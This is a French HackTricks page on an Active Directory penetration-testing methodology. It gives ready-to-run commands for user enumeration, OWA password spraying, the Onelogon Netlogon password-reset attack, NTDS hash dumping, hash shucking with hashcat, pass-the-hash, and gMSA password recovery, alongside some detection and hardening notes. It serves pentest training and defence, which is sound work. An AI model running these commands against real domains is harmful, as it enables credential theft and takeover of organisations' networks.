# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Aperçu de base

**Active Directory** est une technologie fondamentale qui permet aux **administrateurs réseau** de créer et gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d’un réseau. Il est conçu pour être évolutif et faciliter l’organisation d’un grand nombre d’utilisateurs en **groupes** et **sous-groupes** faciles à gérer, tout en contrôlant les **droits d’accès** à différents niveaux.

La structure d’**Active Directory** comprend trois couches principales : les **domaines**, les **arbres** et les **forêts**. Un **domaine** regroupe des objets, tels que des **utilisateurs** ou des **appareils**, qui partagent une base de données commune. Les **arbres** sont des groupes de domaines liés par une structure commune, et une **forêt** regroupe plusieurs arbres interconnectés par des **relations d’approbation**, formant ainsi le niveau supérieur de la structure organisationnelle. Des **droits d’accès** et de **communication** spécifiques peuvent être définis à chacun de ces niveaux.

Les concepts clés d’**Active Directory** sont les suivants :

1. **Annuaire** – Contient toutes les informations relatives aux objets Active Directory.
2. **Objet** – Désigne les entités de l’annuaire, notamment les **utilisateurs**, les **groupes** ou les **dossiers partagés**.
3. **Domaine** – Sert de conteneur pour les objets de l’annuaire. Plusieurs domaines peuvent coexister dans une **forêt**, chacun conservant sa propre collection d’objets.
4. **Arbre** – Regroupement de domaines qui partagent un domaine racine commun.
5. **Forêt** – Sommet de la structure organisationnelle d’Active Directory, composée de plusieurs arbres entre lesquels existent des **relations d’approbation**.

**Active Directory Domain Services (AD DS)** comprend un ensemble de services essentiels à la gestion centralisée et à la communication au sein d’un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **utilisateurs** et les **domaines**, notamment les fonctionnalités d’**authentification** et de **recherche**.
2. **Certificate Services** – Gère la création, la distribution et la gestion des **certificats numériques** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications compatibles avec les annuaires via le **protocole LDAP**.
4. **Directory Federation Services** – Fournit des fonctionnalités d’**authentification unique** permettant d’authentifier les utilisateurs sur plusieurs applications web au cours d’une même session.
5. **Rights Management** – Contribue à protéger les œuvres protégées par le droit d’auteur en réglementant leur distribution et leur utilisation non autorisées.
6. **DNS Service** – Essentiel à la résolution des **noms de domaine**.

Pour une explication plus détaillée, consultez : [**TechTerms - Définition d’Active Directory**](https://techterms.com/definition/active_directory)

### **Authentification Kerberos**

Pour apprendre à **attaquer un AD**, vous devez **bien comprendre** le **processus d’authentification Kerberos**.\
[**Consultez cette page si vous ne savez pas encore comment il fonctionne.**](kerberos-authentication.md)

## Aide-mémoire

Vous pouvez consulter [https://wadcoms.github.io/](https://wadcoms.github.io) pour avoir rapidement un aperçu des commandes que vous pouvez exécuter pour énumérer/exploiter un AD.

> [!WARNING]
> Les communications Kerberos **nécessitent généralement un nom de domaine complet (FQDN)** afin que le client puisse obtenir un ticket pour le SPN approprié. L’accès à une machine par son adresse IP bascule généralement sur NTLM plutôt que sur Kerberos.

## Reconnaissance d’Active Directory (sans identifiants/sessions)

Si vous avez accès à un environnement AD, mais que vous ne disposez d’aucun identifiant ou d’aucune session, vous pouvez :

- **Effectuer un pentest du réseau :**
  - Analyser le réseau, repérer les machines et les ports ouverts, puis tenter d’**exploiter les vulnérabilités** ou d’**extraire des identifiants** (par exemple, [les imprimantes peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
  - L’énumération DNS peut fournir des informations sur les serveurs clés du domaine, comme les serveurs web, les imprimantes, les partages, le VPN, les médias, etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consultez la [**méthodologie générale de pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) pour en savoir plus sur la marche à suivre.
- **Vérifier les accès null et Guest sur les services SMB** (cela ne fonctionnera pas sur les versions modernes de Windows) :
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Vous trouverez un guide plus détaillé sur l’énumération d’un serveur SMB ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Énumérer LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Vous trouverez un guide plus détaillé sur l’énumération de LDAP ici (prêtez une **attention particulière à l’accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Empoisonner le réseau**
  - Récupérer des identifiants en [**usurpant des services avec Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Accéder à un hôte en [**abusant d’une attaque relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Récupérer des identifiants en **exposant** de [**faux services UPnP avec evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
  - Extraire les noms d’utilisateur/noms depuis des documents internes, les réseaux sociaux et les services (principalement web) dans les environnements du domaine, ainsi que depuis les sources accessibles au public.
  - Si vous trouvez les noms complets des employés de l’entreprise, vous pouvez essayer différentes **conventions de nom d’utilisateur** AD ([**lire ceci**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque nom), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
  - Outils :
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Énumération des utilisateurs

- **Énumération SMB/LDAP anonyme :** Consultez les pages sur le [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et le [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Énumération avec Kerbrute** : Lorsqu’un **nom d’utilisateur invalide est demandé**, le serveur répond avec le code d’**erreur Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui nous permet de déterminer que le nom d’utilisateur est invalide. Pour les **noms d’utilisateur valides**, le serveur renvoie soit le **TGT dans une réponse AS-REP**, soit l’erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l’utilisateur doit effectuer une pré-authentification.
- **Aucune authentification auprès de MS-NRPC** : Utiliser auth-level = 1 (aucune authentification) auprès de l’interface MS-NRPC (Netlogon) des contrôleurs de domaine. Après s’être liée à l’interface MS-NRPC, cette méthode appelle la fonction `DsrGetDcNameEx2` pour vérifier si l’utilisateur ou l’ordinateur existe, sans aucun identifiant. L’outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d’énumération. Les recherches sont disponibles [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Serveur OWA (Outlook Web Access)**

Si vous avez trouvé l’un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération des utilisateurs** contre celui-ci. Par exemple, vous pouvez utiliser l’outil [**MailSniper**](https://github.com/dafthack/MailSniper) :

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Vous trouverez des listes de noms d’utilisateur dans [**ce repo GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez connaître les **noms des personnes travaillant dans l’entreprise** grâce à l’étape de recon que vous auriez dû effectuer auparavant. Avec leur prénom et leur nom, vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d’utilisateur potentiellement valides.

### Abus de la liste d’autorisation des canaux vulnérables Netlogon (Onelogon)

Même après l’application du correctif **Zerologon** sur le DC, les comptes explicitement autorisés peuvent rester exposés au **comportement hérité/vulnérable du canal sécurisé Netlogon**. La configuration à risque est la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou la valeur de registre correspondante **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Cette valeur est un **descripteur de sécurité SDDL** (voir [Security Descriptors](security-descriptors.md)). Tout compte ou groupe auquel l’ACE concernée est accordée dans la DACL peut être ciblé. Par exemple, `O:BAG:BAD:(A;;RC;;;WD)` ajoute effectivement **Everyone** à la liste d’autorisation.

Procédure pratique pour l’opérateur :

1. **Identifier les principaux autorisés** en vérifiant à la fois **SYSVOL/GPO** et le **registre du DC en cours d’exécution**.
2. **Résoudre les SID** présents dans le SDDL pour retrouver les utilisateurs/ordinateurs AD correspondants, et donner la priorité aux **comptes machine des DC**, aux **comptes d’approbation** et aux autres machines privilégiées.
3. Tenter de manière répétée une **authentification MS-NRPC / Netlogon** avec le compte autorisé.
4. Après une tentative réussie, abuser de la **définition du mot de passe Netlogon** pour réinitialiser le mot de passe du compte cible (le PoC public le définit sur une chaîne vide).<sup>[[9]](#references)[[10]](#references)</sup>

Exemples rapides de triage / de laboratoire tirés de l’artefact public :

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes :

- Le **scanner** est utile, car la liste d’autorisation effective peut se trouver dans **SYSVOL**, dans le **registre**, ou dans les deux.
- Le chemin d’exploitation lui-même est important, car il **ne nécessite pas de privilèges Domain Admin** une fois qu’un compte vulnérable a été identifié.
- La compromission d’un **compte machine de contrôleur de domaine**, tel que `DC$`, est particulièrement dangereuse, car la réinitialisation de son mot de passe peut directement ouvrir la voie à une **prise de contrôle d’AD** plus étendue.
- La faisabilité de la **brute force** dépend du mode : l’artifact public décrit une approche meet-in-the-middle, une **brute force sur 24 bits** lorsqu’un autre compte ordinateur est disponible, et des variantes plus lentes sur **32 bits**.

Notes de détection et de renforcement :

- Auditez la stratégie de liste d’autorisation et supprimez tout ce qui n’est pas une exception de compatibilité temporaire et explicitement requise.
- Surveillez les événements **5827/5828/5829/5830/5831** du journal **System** des DC pour détecter les connexions Netlogon vulnérables qui sont refusées, découvertes ou explicitement autorisées par la stratégie.
- Considérez les comptes de `VulnerableChannelAllowList` comme **à haut risque** jusqu’à la suppression de la dépendance héritée.

### Connaître un ou plusieurs noms d’utilisateur

Bon, vous savez donc que vous avez déjà un nom d’utilisateur valide, mais aucun mot de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md) : Si un utilisateur **n’a pas** l’attribut _DONT_REQ_PREAUTH_, vous pouvez **demander un message AS_REP** pour cet utilisateur, qui contiendra des données chiffrées à l’aide d’une dérivation du mot de passe de l’utilisateur.
- [**Password Spraying**](password-spraying.md) : Essayons les **mots de passe les plus courants** avec chacun des utilisateurs découverts ; peut-être que certains utilisent un mot de passe faible (tenez compte de la stratégie de mots de passe !).
  - Notez que vous pouvez également **sprayer des serveurs OWA** pour tenter d’accéder aux serveurs de messagerie des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### Empoisonnement LLMNR/NBT-NS

Vous pourriez **obtenir** des **hashes** de challenge en effectuant du **poisoning** sur certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Relais NTLM

L’énumération d’Active Directory fournit des noms d’utilisateur, des identifiants de messagerie et des conventions de nommage, des hôtes candidats et des services susceptibles d’être contraints à s’authentifier. Utilisez ce contexte pour identifier les [**attaques de relais**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM réalisables et les chemins potentiels vers l’environnement AD.

### Reconnaissance et vérifications de la posture de relais avec les workspaces NetExec

- Utilisez les **workspaces `nxcdb`** pour conserver l’état de la reconnaissance AD par engagement : `workspace create <name>` crée des bases de données SQLite par protocole dans `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Basculez entre les vues avec `proto smb|mssql|winrm` et affichez les secrets recueillis avec `creds`. Supprimez manuellement les données sensibles une fois le travail terminé : `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La découverte rapide de sous-réseaux avec **`netexec smb <cidr>`** révèle le **domaine**, la **version du système d’exploitation**, les **exigences de signature SMB** et l’**authentification Null**. Les machines membres affichant `(signing:False)` sont **vulnérables au relais**, tandis que les DC exigent souvent la signature.
- Générez des **noms d’hôte dans /etc/hosts** directement à partir de la sortie de NetExec pour faciliter le ciblage :

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Lorsque le **SMB relay vers le DC est bloqué** par la signature, examinez tout de même la configuration **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / une faible channel binding. Un DC qui exige la signature SMB mais où la signature LDAP est désactivée reste une cible viable de **relay-to-LDAP** pour des abus comme le **SPN-less RBCD**.

### Fuites d'identifiants côté client via les imprimantes → validation en masse des identifiants de domaine

- Les interfaces Web des imprimantes intègrent parfois des mots de passe admin masqués dans le HTML. L'affichage du code source ou l'utilisation des devtools peut révéler le texte en clair (par ex. `<input value="<password>">`), permettant un accès Basic-auth aux dépôts de numérisation et d'impression.
- Les tâches d'impression récupérées peuvent contenir des documents d'intégration en texte brut avec les mots de passe propres à chaque utilisateur. Veillez à conserver les associations lors des tests :<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Voler des identifiants NTLM

Si vous pouvez **accéder à d’autres PC ou partages** avec l’**utilisateur null ou guest**, vous pouvez **y placer des fichiers** (comme un fichier SCF) qui, s’ils sont consultés, **déclen**cheront une authentification NTLM auprès de vous. Vous pourrez alors **voler** le **challenge NTLM** pour le cracker :

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking et attaques NT-Candidate

Le **Hash shucking** considère chaque hash NT que vous possédez déjà comme un mot de passe candidat pour d’autres formats plus lents, dont le matériel de clé est dérivé directement du hash NT. Au lieu de brute-forcer de longues phrases secrètes dans des tickets Kerberos RC4, des challenges NetNTLM ou des identifiants mis en cache, vous fournissez les hashes NT aux modes NT-candidate de Hashcat, qui vérifie la réutilisation des mots de passe sans jamais révéler leur texte en clair. Cette technique est particulièrement efficace après la compromission d’un domaine, lorsque vous pouvez récupérer des milliers de hashes NT actuels et historiques.<sup>[[5]](#references)</sup>

Utilisez le shucking lorsque :

- Vous disposez d’un corpus NT provenant de DCSync, de dumps SAM/SECURITY ou de coffres d’identifiants et souhaitez tester la réutilisation dans d’autres domaines/forêts.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM ou des blobs DCC/DCC2.
- Vous souhaitez rapidement démontrer la réutilisation de longues phrases secrètes impossibles à cracker, puis pivoter immédiatement avec Pass-the-Hash.

Cette technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le hash NT (p. ex. Kerberos etype 17/18 AES). Si un domaine impose l’AES uniquement, vous devez revenir aux modes de mot de passe classiques.

#### Constituer un corpus de hashes NT

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l’historique pour récupérer le plus grand ensemble possible de hashes NT (et leurs valeurs précédentes) :

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Les entrées d’historique élargissent considérablement l’ensemble des candidats, car Microsoft peut stocker jusqu’à 24 anciens hashes par compte. Pour découvrir d’autres moyens de récupérer des secrets NTDS, voir :

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps du cache des endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les logons de domaine mis en cache (DCC/DCC2). Dédupliquez ces hashes et ajoutez-les à la même liste `nt_candidates.txt`.
- **Suivi des métadonnées** – Conservez le nom d’utilisateur et le domaine associés à chaque hash (même si la wordlist ne contient que des chaînes hexadécimales). Les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe lorsque Hashcat affiche le candidat gagnant.
- Privilégiez les candidats provenant de la même forêt ou d’une forêt approuvée ; cela maximise les chances de correspondance lors du shucking.

#### Modes Hashcat pour les candidats NT

| Type de hash                             | Mode mot de passe | Mode candidat NT |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Remarques :

- Les entrées de candidats NT **doivent rester des hashes NT bruts de 32 caractères hexadécimaux**. Désactivez les moteurs de règles (pas de `-r` ni de modes hybrides), car la modification corrompt les données de la clé candidate.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l’espace de recherche NTLM (~30 000 MH/s sur un M3 Max) est environ 100 fois plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT sélectionnée coûte bien moins cher que d’explorer tout l’espace des mots de passe dans le format lent.
- Utilisez toujours la **dernière version de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), car les modes 31500/31600/35300/35400 sont sortis récemment.<sup>[[7]](#references)</sup>
- Il n’existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le mot de passe en clair, car leurs clés sont dérivées avec PBKDF2 à partir de mots de passe UTF-16LE, et non de hashes NT bruts.

#### Exemple – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur à faibles privilèges (voir la page Kerberoast pour plus de détails) :

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuckez le ticket avec votre liste NT :

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l’un de vos hachages NT existants.

3. Basculez immédiatement via PtH :

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Vous pouvez éventuellement récupérer le texte en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Exemple – Identifiants mis en cache (mode 31600)

1. Extraire les connexions mises en cache d’un poste de travail compromis :

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copiez la ligne DCC2 de l'utilisateur du domaine qui vous intéresse dans `dcc2_highpriv.txt`, puis lancez shuck dessus :

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Une correspondance réussie donne le hash NT déjà connu dans votre liste, ce qui prouve que l’utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le en mode NTLM rapide pour retrouver le mot de passe en clair.

Le même workflow s’applique aux réponses aux challenges NetNTLM (`-m 27000/27100`) et à DCC (`-m 31500`). Dès qu’une correspondance est trouvée, vous pouvez lancer un relay, utiliser PtH avec SMB/WMI/WinRM ou re-craquer le hash NT hors ligne avec des masks/rules.



## Énumération d’Active Directory AVEC des identifiants/une session

Pour cette phase, vous devez avoir **compromis les identifiants ou une session d’un compte de domaine valide.** Si vous disposez d’identifiants valides ou d’un shell en tant qu’utilisateur du domaine, **n’oubliez pas que les options indiquées précédemment restent possibles pour compromettre d’autres utilisateurs**.

Avant de commencer l’énumération authentifiée, comprenez le **problème du double-hop Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

Compromettre un compte constitue une **étape majeure dans l’évaluation du domaine**, car cela permet une **énumération authentifiée d’Active Directory** :

Concernant [**ASREPRoast**](asreproast.md), vous pouvez désormais trouver tous les utilisateurs potentiellement vulnérables et, concernant [**Password Spraying**](password-spraying.md), obtenir une **liste de tous les noms d’utilisateur** et essayer le mot de passe du compte compromis, des mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pouvez utiliser la [**CMD pour effectuer une reconnaissance de base**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez également utiliser [**PowerShell pour la reconnaissance**](../basic-powershell-for-pentesters/index.html), ce qui sera plus furtif
- Vous pouvez aussi [**utiliser powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil formidable pour la reconnaissance dans un Active Directory est [**BloodHound**](bloodhound.md). Il **n’est pas très furtif** (selon les méthodes de collecte utilisées), mais **si cela ne vous préoccupe pas**, essayez-le absolument. Repérez où les utilisateurs peuvent se connecter via RDP, trouvez des chemins vers d’autres groupes, etc.
  - **Parmi les autres outils automatisés d’énumération AD :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Consultez les [**enregistrements DNS de l’AD**](ad-dns-records.md), car ils peuvent contenir des informations intéressantes.
- Vous pouvez utiliser **AdExplorer.exe**, un **outil avec interface graphique** de la suite **SysInternal**, pour énumérer l’annuaire.
- Vous pouvez aussi rechercher des identifiants dans la base LDAP avec **ldapsearch**, dans les champs _userPassword_ et _unixUserPassword_, voire dans les notes _description_ et _info_ des utilisateurs. Une chaîne ressemblant à un mot de passe et sans libellé dans _info_ n’est qu’un candidat : confirmez séparément sa fonction et sa validité, et évitez d’inclure le contenu des notes dans les sorties d’énumération habituelles. Consultez [Mot de passe dans le commentaire d’un utilisateur AD sur PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d’autres méthodes.
- Examinez les scripts de connexion au domaine et de mappage de lecteurs **accessibles** dans `\\<dc>\NETLOGON` ou `\\<dc>\SYSVOL\<domain>\scripts`, si votre autorisation le permet. [Microsoft documente](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) le rôle du répertoire de scripts du partage NETLOGON. Commencez par lister les noms, puis examinez uniquement les scripts pertinents et lisibles, dans une limite de taille définie ; ne videz pas l’intégralité d’un partage et n’affichez pas les valeurs des identifiants lors d’une énumération habituelle. Un appel PowerShell à [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **ne protège pas** un mot de passe littéral stocké dans le script. Cet appel, à lui seul, ne prouve pas qu’un secret est codé en dur : suivez la valeur réellement transmise, puis vérifiez séparément le compte, la validité des identifiants et les privilèges. L’examen d’un script de domaine dans un partage distant est distinct de l’énumération d’un hôte local.
- Si vous utilisez **Linux**, vous pouvez également énumérer le domaine avec [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez aussi essayer des outils automatisés tels que :
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraire tous les utilisateurs du domaine**

  Il est très facile d’obtenir tous les noms d’utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section sur l’énumération semble courte, c’est la partie la plus importante de toutes. Consultez les liens (surtout ceux sur CMD, PowerShell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu’à être à l’aise. Lors d’une évaluation, ce sera le moment clé pour trouver un chemin vers DA ou décider qu’il n’y a rien à faire.

### Comptes d’ordinateur précréés prévisibles -> accès au mot de passe gMSA

Les comptes d’ordinateur préparés pour les jonctions héritées peuvent conserver un mot de passe initial prévisible. Le module `pre2k` de NetExec repère la valeur caractéristique `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) et tente d’obtenir un TGT Kerberos avec les 14 premiers caractères du nom d’ordinateur en minuscules, sans le `$` final. Considérez cette valeur UAC comme un critère de sélection des candidats, et ne supposez pas que l’appartenance à **Pre-Windows 2000 Compatible Access** suffit à prouver que le mot de passe est faible.<sup>[[18]](#references)[[20]](#references)</sup>

Utilisez l’énumération LDAP authentifiée pour tester les candidats et enregistrer les TGT obtenus. `ALL=True` étend les tests aux objets qui ne correspondent pas au filtre par défaut `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Un bind par défaut/NTLM qui échoue n’invalide **pas** cette découverte : testez avec `-k`, un FQDN qui se résout vers le DC et une horloge synchronisée avec le KDC. Les exécutions réussies du module écrivent les listes de candidats et les ccaches récupérés dans `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Après avoir compromis le principal ordinateur, cartographiez ses appartenances à des groupes imbriqués et ses droits sortants. En particulier, les principaux nommés dans le descripteur de sécurité `msDS-GroupMSAMembership` d’un gMSA peuvent lire `msDS-ManagedPassword` ; la sortie `--gmsa` de NetExec affiche les principaux autorisés et renvoie le hash NT actuel lorsque l’ordinateur qui s’authentifie est autorisé.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Évaluez ensuite le gMSA récupéré comme n’importe quel autre identifiant : examinez les appartenances aux groupes locaux et de domaine, les droits de connexion, les SPN, la délégation et les services accessibles avant de tenter le pass-the-hash. Cette méthode de récupération fondée sur les ACL est distincte de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), qui permet de dériver les mots de passe gérés après la compromission de la clé racine KDS.<sup>[[20]](#references)</sup>

Un principal ordinateur peut également exercer un contrôle sortant sur d’autres objets ordinateur ou groupes. Après en avoir obtenu un, examinez séparément ses appartenances imbriquées et ses ACL effectives : un droit d’écriture sur un autre objet ordinateur peut permettre de modifier un compte, et des droits d’appartenance à un groupe peuvent donner accès à un rôle de connexion. Un indicateur de compte temporaire, une convention de nommage prévisible ou une relation `GenericWrite` ne suffisent pas, à eux seuls, à prouver l’existence du chemin complet.

Une copie lisible d’un blob `msDS-ManagedPassword` dans un fichier, un partage ou une sauvegarde constitue une exposition distincte : l’ACL de lecture LDAP ne protège pas une copie stockée ailleurs. Vérifiez qu’il s’agit bien d’un blob de mot de passe géré avant de l’interpréter, et distinguez cette situation d’une lecture LDAP autorisée et de la dérivation à partir de la clé racine KDS.

### Kerberoast

Le Kerberoasting consiste à obtenir les **tickets TGS** utilisés par les services associés à des comptes utilisateur et à casser leur chiffrement — fondé sur les mots de passe des utilisateurs — **hors ligne**.

Pour en savoir plus :


{{#ref}}
kerberoast.md
{{#endref}}

